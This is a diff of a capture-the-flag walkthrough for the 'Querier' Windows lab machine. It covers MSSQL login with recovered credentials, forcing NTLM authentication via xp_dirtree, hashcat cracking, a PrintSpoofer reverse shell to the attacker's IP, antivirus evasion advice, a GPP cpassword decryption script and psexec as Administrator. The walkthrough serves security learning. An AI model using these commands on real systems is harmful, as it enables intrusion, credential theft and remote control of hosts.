@@ -2,7 +2,7 @@
 sort : 2
 ---
 
-# nmap scans
+# Querier
 
 PORT        STATE   SERVICE         VERSION
 135/tcp     open    msrpc           Microsoft Windows RPC
@@ -80,13 +80,12 @@ $ olevba File.xlsm
 the user is "Reporting"
 it's password is "PcwTWTHRwryjc$c6"
 
-
-# Connecting to MSSQL DB
+## Connecting to MSSQL DB
 
 ```bash
 $ impacket-mssqlclient USERNAME:'PASSWORD'@IP -windows-auth
 
-$ impacket-mssqlclient Reporting:'passws'@10.129.116.33 -windows-auth
+$ impacket-mssqlclient Reporting:'PcwTWTHRwryjc$c6'@IP -windows-auth
 # [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
 
 # you should find a user with SA privilege
@@ -118,9 +117,9 @@ SQL> xp_dirtree '\\IP_tun0\share-kali\any.txt'
 
 $ echo "mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000" > hash
 
-$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # test1234
+$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # corporate568
 
-$ impacket-mssqlclient mssql-svc:'test1234'@10.129.116.33 -windows-auth
+$ impacket-mssqlclient mssql-svc:'corporate568'@IP -windows-auth
 SQL> select IS_SRVROLEMEMBER ('sysadmin')
 # ------   
 #  1 
@@ -156,11 +155,6 @@ C:\Windows\system32> whoami /priv
 # SeImpersonatePrivilege        Impersonate a client after authentication Enabled   ==> this always can be exploited 
 # SeCreateGlobalPrivilege       Create global objects                     Enabled 
 # SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-
-
-
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell dir ..\..\Users\mssql-svc\Desktop\user.txt
 ```
 
 ### nishang reverse shell 
@@ -198,52 +192,10 @@ some times due to windows firewall, you need to make your netcat listen on port 
 
 
 ```tip
-pick the method that bypass the AV  
+pick the method that bypasses the AV  
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# ntlm relay
-
-corporate568
+<!-- ## ntlm relay
 
 ## what is mssql-svc
 
@@ -253,62 +205,74 @@ type of windows accounts:
 * machine account
 * service account ======> mostly it has the SeImpersonatePrivilege enabled !! 
 
+## SE impersonate
 
-# SE impersonate
+## access tockens exploits hack
 
-# access tockens exploits hack
+### what are Access Tokens
 
-## what are Access Tokens
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens 
 
 Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session.
 
 When a local administrator logins, two access tokens are created: One with admin rights and other one with normal rights. By default, when this user executes a process the one with regular (non-administrator) rights is used. When this user tries to execute anything as administrator ("Run as Administrator" for example) the UAC will be used to ask for permission.
-If you want to learn more about the UAC read this page.
+If you want to learn more about the UAC read this page. -->
 
 ```bash
 $ nc -lnvp 1235
 ```
 
 ```powershell
-C:\Windows\system32> PrintSpoofer64.exe -c "rev.exe 10.10.16.6 1235 -e cmd.exe"
+C:\Windows\system32> PrintSpoofer64.exe -c "rev.exe IP_tun0 1235 -e cmd.exe"
+```
+
+```tip
+PrintSpoofer :: used mostly when you have a service account
+JuicyPotato  :: used mostly when you have a user account
 ```
 
 
-PrintSpoofer : : used mostly when you have a service account
+## gpp vulnerability privilege escalation
 
-JuicyPotato : : used mostly when you have a user account
-
-
-
-<br>
-<br>
-<br>
-
-===============================================================
-
-<br>
-<br>
-<br>
-
-
-Nishang/Shells/Invoke-PowerShellTcp.ps1
-
-on kali 
-```bash
-$ pwsh
-```
 ```powershell
-PS> import-module Invoke-PowerShellTcp.ps1
-PS> get-module
-# Invoke-PowerShellTcp.ps1
+# After running Powerup
 
-PS> 
-
-PS> 
+PS> cat ​'C:\ProgramData\Microsoft\Group
+Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\G
+roups\Groups.xml'
 ```
 
+To decrypt the Administrator password
 
+```python
+from Crypto.Cipher import AES
+from base64 import b64decode
+
+cpassword = "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"
+
+# From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29 #endNote2
+
+key = ​"""
+4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
+f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
+"""​.replace(​" "​,​""​).replace(​"\n"​,​""​).decode(​'hex'​)
+
+# Add padding to the base64 string and decode it
+cpassword += ​"="​ * ((4 - len(cpassword) % 4) % 4)
+password = b64decode(cpassword)
+
+# Decrypt the password
+o = AES.new(key, AES.MODE_CBC, ​"\x00"​ * 16).decrypt(password)
+
+# Print it
+print​ o[:-ord(o[-1])].decode(​'utf16'​)
+```
+
+Good luck ^^
+
+```bash
+$ python3 psexec.py Administrator:​'MyUnclesAreMarioAndLuigi!!1!'​@IP
+```
 
 
 
